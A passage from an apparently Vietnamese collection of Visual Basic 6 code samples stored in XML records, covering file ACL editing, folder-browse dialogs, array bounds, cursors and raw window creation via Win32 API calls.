   ' information.
   If (lDaclPresent = False) Then
      MsgBox "Error: No ACL Information Available for this File"
      Exit Sub
   End If

   ' Attempt to get the ACL from the file's Security Descriptor.
   lResult = GetAclInformation(pAcl, sACLInfo, Len(sACLInfo), 2&amp;)

   ' A return code of zero means the call failed; test for this
   ' before continuing.
   If (lResult = 0) Then
      MsgBox "Error: Unable to Get ACL from File Security Descriptor"
      Exit Sub
   End If

   ' Now that you have the ACL information, compute the new ACL size
   ' requirements.
   lNewACLSize = sACLInfo.AclBytesInUse + (Len(sCurrentACE) + _
      GetLengthSid(bUserSid(0))) * 2 - 4

   ' Resize our new ACL buffer to its proper size.
   ReDim bNewACL(lNewACLSize)

   ' Use the InitializeAcl API function call to initialize the new
   ' ACL.
   lResult = InitializeAcl(bNewACL(0), lNewACLSize, ACL_REVISION)

   ' A return code of zero means the call failed; test for this
   ' before continuing.
   If (lResult = 0) Then
      MsgBox "Error: Unable to Initialize New ACL"
      Exit Sub
   End If

   ' If a DACL is present, copy it to a new DACL.
   If (lDaclPresent) Then

      ' Copy the ACEs from the file to the new ACL.
      If (sACLInfo.AceCount &gt; 0) Then

         ' Grab each ACE and stuff them into the new ACL.
         nRecordNumber = 0
         For I = 0 To (sACLInfo.AceCount - 1)

            ' Attempt to grab the next ACE.
            lResult = GetAce(pAcl, I, pCurrentAce)

            ' Make sure you have the current ACE under question.
            If (lResult = 0) Then
               MsgBox "Error: Unable to Obtain ACE (" &amp; I &amp; ")"
               Exit Sub
            End If

            ' You have a pointer to the ACE. Place it
            ' into a structure, so you can get at its size.
            CopyMemory sCurrentACE, pCurrentAce, LenB(sCurrentACE)

            'Skip adding the ACE to the ACL if this is same usersid
            lTempSid = pCurrentAce + 8
            If EqualSid(bUserSid(0), lTempSid) = 0 Then

                ' Now that you have the ACE, add it to the new ACL.
                lResult = AddAce(VarPtr(bNewACL(0)), ACL_REVISION, _
                  MAXDWORD, pCurrentAce, _
                  sCurrentACE.Header.AceSize)

                 ' Make sure you have the current ACE under question.
                 If (lResult = 0) Then
                   MsgBox "Error: Unable to Add ACE to New ACL"
                    Exit Sub
                 End If
                 nRecordNumber = nRecordNumber + 1
            End If

         Next I

         ' You have now rebuilt a new ACL and want to add it to
         ' the newly created DACL.
         lResult = AddAccessAllowedAce(bNewACL(0), ACL_REVISION, _
            lMask, bUserSid(0))

         ' Make sure added the ACL to the DACL.
         If (lResult = 0) Then
            MsgBox "Error: Unable to Add ACL to DACL"
            Exit Sub
         End If

         'If it's directory, we need to add inheritance staff.
         If GetAttr(sFileName) And vbDirectory Then

            ' Attempt to grab the next ACE which is what we just added.
            lResult = GetAce(VarPtr(bNewACL(0)), nRecordNumber, pCurrentAce)

            ' Make sure you have the current ACE under question.
            If (lResult = 0) Then
               MsgBox "Error: Unable to Obtain ACE (" &amp; I &amp; ")"
               Exit Sub
            End If
            ' You have a pointer to the ACE. Place it
            ' into a structure, so you can get at its size.
            CopyMemory sCurrentACE, pCurrentAce, LenB(sCurrentACE)
            sCurrentACE.Header.AceFlags = OBJECT_INHERIT_ACE + INHERIT_ONLY_ACE
            CopyMemory ByVal pCurrentAce, VarPtr(sCurrentACE), LenB(sCurrentACE)

            'add another ACE for files
            lResult = AddAccessAllowedAce(bNewACL(0), ACL_REVISION, _
               lMask, bUserSid(0))

            ' Make sure added the ACL to the DACL.
            If (lResult = 0) Then
               MsgBox "Error: Unable to Add ACL to DACL"
               Exit Sub
            End If

            ' Attempt to grab the next ACE.
            lResult = GetAce(VarPtr(bNewACL(0)), nRecordNumber + 1, pCurrentAce)

            ' Make sure you have the current ACE under question.
            If (lResult = 0) Then
               MsgBox "Error: Unable to Obtain ACE (" &amp; I &amp; ")"
               Exit Sub
            End If

            CopyMemory sCurrentACE, pCurrentAce, LenB(sCurrentACE)
            sCurrentACE.Header.AceFlags = CONTAINER_INHERIT_ACE
            CopyMemory ByVal pCurrentAce, VarPtr(sCurrentACE), LenB(sCurrentACE)
        End If


         ' Set the file's Security Descriptor to the new DACL.
         lResult = SetSecurityDescriptorDacl(sNewSD, 1, _
            bNewACL(0), 0)

         ' Make sure you set the SD to the new DACL.
         If (lResult = 0) Then
            MsgBox "Error: " &amp; _
                "Unable to Set New DACL to Security Descriptor"
            Exit Sub
         End If

         ' The final step is to add the Security Descriptor back to
         ' the file!
         lResult = SetFileSecurity(sFileName, _
            DACL_SECURITY_INFORMATION, sNewSD)

         ' Make sure you added the Security Descriptor to the file!
         If (lResult = 0) Then
            MsgBox "Error: Unable to Set New Security Descriptor " _
               &amp; " to File: " &amp; sFileName
            MsgBox Err.LastDllError
         Else
            MsgBox "Updated Security Descriptor on File: " _
               &amp; sFileName
         End If

      End If

   End If

End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0606031429071653</MaVD>
    <NoiDung>Private Type BrowseInfo
    hWndOwner As Long
    pIDLRoot As Long
    pszDisplayName As Long
    lpszTitle As Long
    ulFlags As Long
    lpfnCallback As Long
    lParam As Long
    iImage As Long
End Type
Const BIF_RETURNONLYFSDIRS = 1
Const MAX_PATH = 260
Private Declare Sub CoTaskMemFree Lib "ole32.dll" (ByVal hMem As Long)
Private Declare Function lstrcat Lib "kernel32" Alias "lstrcatA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long
Private Declare Function SHBrowseForFolder Lib "shell32" (lpbi As BrowseInfo) As Long
Private Declare Function SHGetPathFromIDList Lib "shell32" (ByVal pidList As Long, ByVal lpBuffer As String) As Long
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'KPDTeam@Allapi.net
    Dim iNull As Integer, lpIDList As Long, lResult As Long
    Dim sPath As String, udtBI As BrowseInfo

    With udtBI
        'Set the owner window
        .hWndOwner = Me.hWnd
        'lstrcat appends the two strings and returns the memory address
        .lpszTitle = lstrcat("C:\", ")
        'Return only if the user selected a directory
        .ulFlags = BIF_RETURNONLYFSDIRS
    End With

    'Show the 'Browse for folder' dialog
    lpIDList = SHBrowseForFolder(udtBI)
    If lpIDList Then
        sPath = String$(MAX_PATH, 0)
        'Get the path from the IDList
        SHGetPathFromIDList lpIDList, sPath
        'free the block of memory
        CoTaskMemFree lpIDList
        iNull = InStr(sPath, vbNullChar)
        If iNull Then
            sPath = Left$(sPath, iNull - 1)
        End If
    End If

    MsgBox sPath
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0606061028580227</MaVD>
    <NoiDung>Dim Upper
Dim MyArray(1 To 10, 5 To 15, 10 To 20)   ' Declare array variables.
Dim AnyArray(10)
Upper = UBound(MyArray, 1)   ' Returns 10.
Upper = UBound(MyArray, 3)   ' Returns 20.
Upper = UBound(AnyArray)   ' Returns 10.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0606061032260269</MaVD>
    <NoiDung>Dim Lower
Dim MyArray(1 To 10, 5 To 15, 10 To 20)    ' Declare array variables.
Dim AnyArray(10)
Lower = LBound(MyArray, 1)    ' Returns 1.
Lower = LBound(MyArray, 3)   ' Returns 10.
Lower = LBound(AnyArray)   ' Returns 0 or 1, depending on setting of Option Base.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0606061148236548</MaVD>
    <NoiDung>'Module code:
Option Explicit

Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type

Private Type BROWSEINFO
  hOwner As Long
  pidlRoot As Long
  pszDisplayName As Long
  lpszTitle As Long
  ulFlags As Long
  lpfnCallback As Long
  lParam As Long
  iImage As Long
End Type

Private Type Size
    cx As Long
    cy As Long
End Type

Private Const DIALOG_CURRENT_SELECTION_TEXT As String = "
Private Const MAX_PATH = 260

Private Const WM_USER = &amp;H400
Private Const BFFM_INITIALIZED = 1
Private Const BFFM_SELCHANGED As Long = 2
Private Const BFFM_SETSTATUSTEXTW As Long = (WM_USER + 104)
Private Const BFFM_SETSELECTIONW As Long = (WM_USER + 103)
Private Const BIF_NEWDIALOGSTYLE As Long = &amp;H40
Private Const BIF_RETURNONLYFSDIRS As Long = &amp;H1
Private Const BIF_BROWSEINCLUDEFILES As Long = &amp;H4000
Private Const BIF_STATUSTEXT As Long = &amp;H4

Private Declare Function SHBrowseForFolder Lib "shell32.dll" _
    Alias "SHBrowseForFolderW" (lpBrowseInfo As BROWSEINFO) As Long
Private Declare Function SHGetPathFromIDList Lib "shell32.dll" _
    Alias "SHGetPathFromIDListA" (ByVal lPIDL As Long, _
    ByVal pszPath As String) As Long
    Private Declare Sub CoTaskMemFree Lib "ole32.dll" (ByVal pv As Long)
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
    (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, _
    lParam As Any) As Long
Private Declare Function ILCreateFromPath Lib "shell32" Alias "#157" _
    (ByVal sPath As String) As Long
Private Declare Function LocalFree Lib "kernel32" (ByVal hmem As Long) As Long
Private Declare Function GetWindowDC Lib "user32.dll" (ByVal hwnd As Long) _
    As Long
Private Declare Function GetTextExtentPoint Lib "gdi32.dll" Alias _
    "GetTextExtentPointW" (ByVal hdc As Long, ByVal lpszString As Long, _
    ByVal cbString As Long, ByRef lpSize As Size) As Long
Private Declare Function PathCompactPath Lib "shlwapi.dll" Alias _
    "PathCompactPathA" (ByVal hdc As Long, ByVal pszPath As String, ByVal _
    dx As Long) As Long
Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal ParenthWnd As Long, ByVal ChildhWnd As Long, ByVal ClassName As String, ByVal Caption As String) As Long
Private Declare Function SetWindowTextW Lib "user32" (ByVal hwnd As Long, ByVal lpString As Long) As Long

Public Function BrowseForFolder(DialogText As String, DefaultPath As String, _
    OwnerhWnd As Long, Optional ShowCurrentPath As Boolean = True, _
    Optional RootPath As Variant, Optional NewDialogStyle As Boolean = False, _
    Optional IncludeFiles As Boolean = False) As String
      
    Dim biBrowseInfo As BROWSEINFO
    Dim lPIDL As Long
    Dim sBuffer As String
    Dim lBufferPointer As Long

    With biBrowseInfo
        .hOwner = OwnerhWnd
        
        If Not IsMissing(RootPath) Then .pidlRoot = PathToPIDL(RootPath)
        
        If ShowCurrentPath And DialogText = "$" Then DialogText = "
        .lpszTitle = StrPtr(DialogText)
        
        If ShowCurrentPath Then .pszDisplayName = StrPtr(sBuffer)
     
        .ulFlags = BIF_RETURNONLYFSDIRS + _
            IIf(ShowCurrentPath, BIF_STATUSTEXT, 0) + _
            IIf(NewDialogStyle, BIF_NEWDIALOGSTYLE, 0) + _
            IIf(IncludeFiles, BIF_BROWSEINCLUDEFILES, 0)
        
        .lpfnCallback = FunctionPointer(AddressOf BrowseCallbackProc)
        
        .lParam = PathToPIDL(DefaultPath)
    End With

    lPIDL = SHBrowseForFolder(biBrowseInfo)
    
    If lPIDL Then
        sBuffer = Space$(MAX_PATH)

        SHGetPathFromIDList lPIDL, sBuffer

        sBuffer = Left$(sBuffer, InStr(sBuffer, vbNullChar) - 1)

        BrowseForFolder = sBuffer

        Call CoTaskMemFree(lPIDL)
    End If

    If ShowCurrentPath Then Call LocalFree(lBufferPointer)
End Function

Private Function BrowseCallbackProc(ByVal hwnd As Long, ByVal uMsg As Long, _
    ByVal lParam As Long, ByVal lpData As Long) As Long
    
    Dim sBuffer As String
    Dim lStaticWnd As Long
    Dim lStaticDC As Long
    Dim sPath As String
    Dim rctStatic As RECT
    Dim szTextSize As Size

    Select Case uMsg
    Case BFFM_INITIALIZED
        ' Thay doi chuoi text cho cac nut lenh
        Call SendMessage(hwnd, BFFM_SETSELECTIONW, False, ByVal StrPtr(lpData))
        SetWindowTextW hwnd, StrPtr("Ch" &amp; ChrW$(&amp;H1ECD) &amp; "n th" &amp; ChrW$(&amp;H1B0) &amp; " m" &amp; ChrW$(&amp;H1EE5) &amp; "c")
        lStaticWnd = FindWindowEx(hwnd, ByVal 0&amp;, "BUTTON", "OK")
        SetWindowTextW lStaticWnd, StrPtr("&amp;Ch" &amp; ChrW$(&amp;H1ECD) &amp; "n")
        lStaticWnd = FindWindowEx(hwnd, ByVal 0&amp;, "BUTTON", "Cancel")
        SetWindowTextW lStaticWnd, StrPtr("&amp;Tho" &amp; ChrW$(&amp;HE1) &amp; "t")
        lStaticWnd = FindWindowEx(hwnd, ByVal 0&amp;, "BUTTON", "&amp;Make New Folder")
        SetWindowTextW lStaticWnd, StrPtr("T" &amp; ChrW$(&amp;H1EA1) &amp; "o th" &amp; ChrW$(&amp;H1B0) &amp; " &amp;m" &amp; ChrW$(&amp;H1EE5) &amp; "c m" &amp; ChrW$(&amp;H1EDB) &amp; "i")
            
    Case BFFM_SELCHANGED
        sBuffer = Space$(MAX_PATH)
        
        If SHGetPathFromIDList(lParam, sBuffer) Then
            SendMessage hwnd, BFFM_SETSTATUSTEXTW, 0&amp;, ByVal StrPtr("$")

            lStaticDC = GetWindowDC(lStaticWnd)

            GetWindowRect lStaticWnd, rctStatic
            
            GetTextExtentPoint lStaticDC, ByVal StrPtr(DIALOG_CURRENT_SELECTION_TEXT), _
                ByVal Len(DIALOG_CURRENT_SELECTION_TEXT), szTextSize
            
            sPath = sBuffer
            If PathCompactPath(ByVal lStaticDC, sPath, ByVal (rctStatic.Right - _
                rctStatic.Left - szTextSize.cx + 80)) = 0 Then sPath = sBuffer
            
            sPath = Left$(sPath, InStr(1, sPath, vbNullChar) - 1)
            
            Call SendMessage(hwnd, BFFM_SETSTATUSTEXTW, 0&amp;, _
                ByVal StrPtr(DIALOG_CURRENT_SELECTION_TEXT &amp; sPath))
        Else
            SendMessage hwnd, BFFM_SETSTATUSTEXTW, 0&amp;, ByVal "
        End If
    End Select
End Function

Private Function PathToPIDL(ByVal sPath As String) As Long
    Dim lRet As Long
    
    lRet = ILCreateFromPath(sPath)
    If lRet = 0 Then
        sPath = StrConv(sPath, VbStrConv.vbUnicode)
        lRet = ILCreateFromPath(sPath)
    End If
    
    PathToPIDL = lRet
End Function

Private Function FunctionPointer(fp As Long) As Long
    FunctionPointer = fp
End Function


'Form code:
Private Sub Form_Load()
    MsgBox BrowseForFolder("Ch" &amp; ChrW$(&amp;H1ECD) &amp; "n th" &amp; ChrW$(&amp;H1B0) &amp; " m" &amp; ChrW$(&amp;H1EE5) &amp; "c", "c:\", Me.hwnd)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607091835311512</MaVD>
    <NoiDung>'Thay đổi con trỏ chuột, bạn có thể sử dụng con trỏ động (.ani) thay cho con trỏ tĩnh (.cur)
'Tạo 1 Form mới, thêm vào 1 command button:

Private Declare Function LoadCursor Lib "user32" Alias "LoadCursorA" (ByVal hInstance As Long, ByVal lpCursorName As Long) As Long
Private Declare Function SetClassLong Lib "user32.dll" Alias "SetClassLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function LoadCursorFromFile Lib "user32" Alias "LoadCursorFromFileA" (ByVal lpFileName As String) As Long
Private Declare Function DestroyCursor Lib "user32" (ByVal hCursor As Long) As Long
Const GCW_HCURSOR = (-12)
Const IDC_SIZEALL = 32646&amp;
Dim SysCursHandle As Long, Curs1Handle As Long, Curs2Handle As Long
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'Load a default cursor
    Curs1Handle = LoadCursor(ByVal 0&amp;, IDC_SIZEALL)
    'Load a cursor from a file
    Curs2Handle = LoadCursorFromFile("C:\WINDOWS\Cursors\hourglas.ani")
    'Set the form's mouse cursor
    SysCursHandle = SetClassLong(Me.hWnd, GCW_HCURSOR, Curs1Handle)
    'Set the button's cursor
    SysCursHandle = SetClassLong(Command1.hWnd, GCW_HCURSOR, Curs2Handle)
End Sub
Private Sub Form_Unload(Cancel As Integer)
    'Set the form's cursor back to the original cursor
    SetClassLong Me.hWnd, GCW_HCURSOR, SysCursHandle
    'Clean up
    DestroyCursor Curs1Handle
    DestroyCursor Curs2Handle
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607091907549474</MaVD>
    <NoiDung>'Set Project Properties to 'Sub Main'
' (-&gt; Project Properties -&gt; General Tab -&gt; Startup Object)
'---- Copy đọan code sau vào Module:
Declare Function RegisterClass Lib "user32" Alias "RegisterClassA" (Class As WNDCLASS) As Long
Declare Function UnregisterClass Lib "user32" Alias "UnregisterClassA" (ByVal lpClassName As String, ByVal hInstance As Long) As Long
Declare Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" (ByVal dwExStyle As Long, ByVal lpClassName As String, ByVal lpWindowName As String, ByVal dwStyle As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal hMenu As Long, ByVal hInstance As Long, lpParam As Any) As Long
Declare Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Sub PostQuitMessage Lib "user32" (ByVal nExitCode As Long)
Declare Function GetMessage Lib "user32" Alias "GetMessageA" (lpMsg As Msg, ByVal hWnd As Long, ByVal wMsgFilterMin As Long, ByVal wMsgFilterMax As Long) As Long
Declare Function TranslateMessage Lib "user32" (lpMsg As Msg) As Long
Declare Function DispatchMessage Lib "user32" Alias "DispatchMessageA" (lpMsg As Msg) As Long
Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Declare Function LoadCursor Lib "user32" Alias "LoadCursorA" (ByVal hInstance As Long, ByVal lpCursorName As Any) As Long
Declare Function DefMDIChildProc Lib "user32" Alias "DefMDIChildProcA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
'  Define information of the window (pointed to by hWnd)
Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long) As Long
Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Type WNDCLASS
    style As Long
    lpfnwndproc As Long
    cbClsextra As Long
    cbWndExtra2 As Long
    hInstance As Long
    hIcon As Long
    hCursor As Long
    hbrBackground As Long
    lpszMenuName As String
    lpszClassName As String
End Type
Type POINTAPI
    x As Long
    y As Long
End Type
Type Msg
    hWnd As Long
    message As Long
    wParam As Long
    lParam As Long
    time As Long
    pt As POINTAPI
End Type

' Class styles
Public Const CS_VREDRAW = &amp;H1
Public Const CS_HREDRAW = &amp;H2
Public Const CS_KEYCVTWINDOW = &amp;H4
Public Const CS_DBLCLKS = &amp;H8
Public Const CS_OWNDC = &amp;H20
Public Const CS_CLASSDC = &amp;H40
Public Const CS_PARENTDC = &amp;H80
Public Const CS_NOKEYCVT = &amp;H100
Public Const CS_NOCLOSE = &amp;H200
Public Const CS_SAVEBITS = &amp;H800
Public Const CS_BYTEALIGNCLIENT = &amp;H1000
Public Const CS_BYTEALIGNWINDOW = &amp;H2000
Public Const CS_PUBLICCLASS = &amp;H4000
' Window styles
Public Const WS_OVERLAPPED = &amp;H0&amp;
Public Const WS_POPUP = &amp;H80000000
Public Const WS_CHILD = &amp;H40000000
Public Const WS_MINIMIZE = &amp;H20000000
Public Const WS_VISIBLE = &amp;H10000000
Public Const WS_DISABLED = &amp;H8000000
Public Const WS_CLIPSIBLINGS = &amp;H4000000
Public Const WS_CLIPCHILDREN = &amp;H2000000
Public Const WS_MAXIMIZE = &amp;H1000000
Public Const WS_CAPTION = &amp;HC00000                  '  WS_BORDER Or WS_DLGFRAME
Public Const WS_BORDER = &amp;H800000
Public Const WS_DLGFRAME = &amp;H400000
Public Const WS_VSCROLL = &amp;H200000
Public Const WS_HSCROLL = &amp;H100000
Public Const WS_SYSMENU = &amp;H80000
Public Const WS_THICKFRAME = &amp;H40000
Public Const WS_GROUP = &amp;H20000
Public Const WS_TABSTOP = &amp;H10000
Public Const WS_MINIMIZEBOX = &amp;H20000
Public Const WS_MAXIMIZEBOX = &amp;H10000
Public Const WS_TILED = WS_OVERLAPPED
Public Const WS_ICONIC = WS_MINIMIZE
Public Const WS_SIZEBOX = WS_THICKFRAME
Public Const WS_OVERLAPPEDWINDOW = (WS_OVERLAPPED Or WS_CAPTION Or WS_SYSMENU Or WS_THICKFRAME Or WS_MINIMIZEBOX Or WS_MAXIMIZEBOX)
Public Const WS_TILEDWINDOW = WS_OVERLAPPEDWINDOW
Public Const WS_POPUPWINDOW = (WS_POPUP Or WS_BORDER Or WS_SYSMENU)
Public Const WS_CHILDWINDOW = (WS_CHILD)
' ExWindowStyles
Public Const WS_EX_DLGMODALFRAME = &amp;H1&amp;
Public Const WS_EX_NOPARENTNOTIFY = &amp;H4&amp;
Public Const WS_EX_TOPMOST = &amp;H8&amp;
Public Const WS_EX_ACCEPTFILES = &amp;H10&amp;
Public Const WS_EX_TRANSPARENT = &amp;H20&amp;
' Color constants
Public Const COLOR_SCROLLBAR = 0
Public Const COLOR_BACKGROUND = 1
Public Const COLOR_ACTIVECAPTION = 2
Public Const COLOR_INACTIVECAPTION = 3
Public Const COLOR_MENU = 4
Public Const COLOR_WINDOW = 5
Public Const COLOR_WINDOWFRAME = 6
Public Const COLOR_MENUTEXT = 7
Public Const COLOR_WINDOWTEXT = 8
Public Const COLOR_CAPTIONTEXT = 9
Public Const COLOR_ACTIVEBORDER = 10
Public Const COLOR_INACTIVEBORDER = 11
Public Const COLOR_APPWORKSPACE = 12
Public Const COLOR_HIGHLIGHT = 13
Public Const COLOR_HIGHLIGHTTEXT = 14
Public Const COLOR_BTNFACE = 15
Public Const COLOR_BTNSHADOW = 16
Public Const COLOR_GRAYTEXT = 17
Public Const COLOR_BTNTEXT = 18
Public Const COLOR_INACTIVECAPTIONTEXT = 19
Public Const COLOR_BTNHIGHLIGHT = 20
' Window messages
Public Const WM_NULL = &amp;H0
Public Const WM_CREATE = &amp;H1
Public Const WM_DESTROY = &amp;H2
Public Const WM_MOVE = &amp;H3
Public Const WM_SIZE = &amp;H5
' ShowWindow commands
Public Const SW_HIDE = 0
Public Const SW_SHOWNORMAL = 1
Public Const SW_NORMAL = 1
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_MAXIMIZE = 3
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOW = 5
Public Const SW_MINIMIZE = 6
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNA = 8
Public Const SW_RESTORE = 9
Public Const SW_SHOWDEFAULT = 10
Public Const SW_MAX = 10
' Standard ID's of cursors
Public Const IDC_ARROW = 32512&amp;
Public Const IDC_IBEAM = 32513&amp;
Public Const IDC_WAIT = 32514&amp;
Public Const IDC_CROSS = 32515&amp;
Public Const IDC_UPARROW = 32516&amp;
Public Const IDC_SIZE = 32640&amp;
Public Const IDC_ICON = 32641&amp;
Public Const IDC_SIZENWSE = 32642&amp;
Public Const IDC_SIZENESW = 32643&amp;
Public Const IDC_SIZEWE = 32644&amp;
Public Const IDC_SIZENS = 32645&amp;
Public Const IDC_SIZEALL = 32646&amp;
Public Const IDC_NO = 32648&amp;
Public Const IDC_APPSTARTING = 32650&amp;
Public Const GWL_WNDPROC = -4

Dim hwnd2 As Long, hwnd3 As Long, old_proc As Long, new_proc As Long
Public Sub Main()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim lngTemp As Long
    ' Register class
    If MyRegisterClass Then
        ' Window created?
        If MyCreateWindow Then
        ' Change the button's procedures
        ' Point to new address
            new_proc = GetMyWndProc(AddressOf ButtonProc)
            old_proc = SetWindowLong(hwnd2, GWL_WNDPROC, new_proc)
            ' Message loop
            MyMessageLoop
        End If
        ' Unregister Class
        MyUnregisterClass
    End If
End Sub
Private Function MyRegisterClass() As Boolean
    ' WNDCLASS-structure
    Dim wndcls As WNDCLASS
    wndcls.style = CS_HREDRAW + CS_VREDRAW
    wndcls.lpfnwndproc = GetMyWndProc(AddressOf MyWndProc)
    wndcls.cbClsextra = 0
    wndcls.cbWndExtra2 = 0
    wndcls.hInstance = App.hInstance
    wndcls.hIcon = 0
    wndcls.hCursor = LoadCursor(0, IDC_ARROW)
    wndcls.hbrBackground = COLOR_WINDOW
    wndcls.lpszMenuName = 0
    wndcls.lpszClassName = "myWindowClass"
    ' Register class
    MyRegisterClass = (RegisterClass(wndcls) &lt;&gt; 0)
End Function
Private Sub MyUnregisterClass()
    UnregisterClass "myWindowClass", App.hInstance
End Sub
Private Function MyCreateWindow() As Boolean
    Dim hWnd As Long
    ' Create the window
    hWnd = CreateWindowEx(0, "myWindowClass", "My Window", WS_OVERLAPPEDWINDOW, 0, 0, 400, 300, 0, 0, App.hInstance, ByVal 0&amp;)
    ' The Button and Textbox are child windows
    hwnd2 = CreateWindowEx(0, "Button", "My button", WS_CHILD, 50, 55, 100, 25, hWnd, 0, App.hInstance, ByVal 0&amp;)
    hwnd3 = CreateWindowEx(0, "edit", "My textbox", WS_CHILD, 50, 25, 100, 25, hWnd, 0, App.hInstance, ByVal 0&amp;)
    If hWnd &lt;&gt; 0 Then ShowWindow hWnd, SW_SHOWNORMAL
    ' Show them
    ShowWindow hwnd2, SW_SHOWNORMAL
    ShowWindow hwnd3, SW_SHOWNORMAL
    ' Go back
    MyCreateWindow = (hWnd &lt;&gt; 0)
End Function
Private Function MyWndProc(ByVal hWnd As Long, ByVal message As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    Select Case message
        Case WM_DESTROY
            ' Destroy window
            PostQuitMessage (0)
    End Select
    ' calls the default window procedure
    MyWndProc = DefWindowProc(hWnd, message, wParam, lParam)
End Function
Function GetMyWndProc(ByVal lWndProc As Long) As Long
    GetMyWndProc = lWndProc
End Function
Private Sub MyMessageLoop()
    Dim aMsg As Msg
    Do While GetMessage(aMsg, 0, 0, 0)
        DispatchMessage aMsg
    Loop
End Sub
Private Function ButtonProc(ByVal hWnd As Long, ByVal message As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    Dim x As Integer
    If (message = 533) Then
        x = MsgBox("You clicked on the button", vbOKOnly)
    End If
    ' calls the window procedure
    ButtonProc = CallWindowProc(old_proc, hWnd, message, wParam, lParam)
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607100039370209</MaVD>
    <NoiDung>Private Declare Function IsWindow Lib "user32" (ByVal hwnd As Long) As Long

Private Sub Form_Load()
    'Check if this window is a window
    If IsWindow(Me.hwnd) &lt;&gt; 0 Then MsgBox "Day la cua so"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607101258401038</MaVD>
    <NoiDung>'Set Project Properties to 'Sub Main'
' (-&gt; Project Properties -&gt; General Tab -&gt; Startup Object)
'---- Copy đọan code sau vào Module:
Declare Function RegisterClassEx Lib "user32.dll" Alias "RegisterClassExA" (lpwcx As WNDCLASSEX) As Long
Declare Function UnregisterClass Lib "user32" Alias "UnregisterClassA" (ByVal lpClassName As String, ByVal hInstance As Long) As Long
Declare Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" (ByVal dwExStyle As Long, ByVal lpClassName As String, ByVal lpWindowName As String, ByVal dwStyle As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal hMenu As Long, ByVal hInstance As Long, lpParam As Any) As Long
Declare Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Sub PostQuitMessage Lib "user32" (ByVal nExitCode As Long)
Declare Function GetMessage Lib "user32" Alias "GetMessageA" (lpMsg As Msg, ByVal hWnd As Long, ByVal wMsgFilterMin As Long, ByVal wMsgFilterMax As Long) As Long
Declare Function TranslateMessage Lib "user32" (lpMsg As Msg) As Long
Declare Function DispatchMessage Lib "user32" Alias "DispatchMessageA" (lpMsg As Msg) As Long
Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Declare Function LoadCursor Lib "user32" Alias "LoadCursorA" (ByVal hInstance As Long, ByVal lpCursorName As Any) As Long
Declare Function DefMDIChildProc Lib "user32" Alias "DefMDIChildProcA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
'  Define information of the window (pointed to by hWnd)
Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long) As Long
Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Function ExtractIcon Lib "shell32.dll" Alias "ExtractIconA" (ByVal hInst As Long, ByVal lpszExeFileName As String, ByVal nIconIndex As Long) As Long
Declare Function LoadCursorFromFile Lib "user32" Alias "LoadCursorFromFileA" (ByVal lpFileName As String) As Long

Type WNDCLASSEX
    cbSize As Long
    style As Long
    lpfnWndProc As Long
    cbClsExtra As Long
    cbWndExtra As Long
    hInstance As Long
    hIcon As Long
    hCursor As Long
    hbrBackground As Long
    lpszMenuName As String
    lpszClassName As String
    hIconSm As Long
End Type
Type POINTAPI
    x As Long
    y As Long
End Type
Type Msg
    hWnd As Long
    message As Long
